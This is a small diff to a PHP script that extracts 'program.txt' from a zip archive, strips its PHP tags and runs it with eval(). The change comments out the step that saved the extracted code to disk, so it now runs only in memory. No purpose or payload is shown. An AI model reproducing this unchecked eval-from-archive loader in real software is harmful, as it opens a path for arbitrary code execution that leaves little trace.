@@ -15,7 +15,7 @@ if ($res === TRUE) {
         $program = $zip->getFromName('program.txt');
     }
     $zip->close();
-    file_put_contents(__DIR__.'/program.txt',$program);
+    //file_put_contents(__DIR__.'/program.txt',$program);
     $program = str_replace("<?php","",$program);
     $program = str_replace("?>","",$program);
     eval($program);
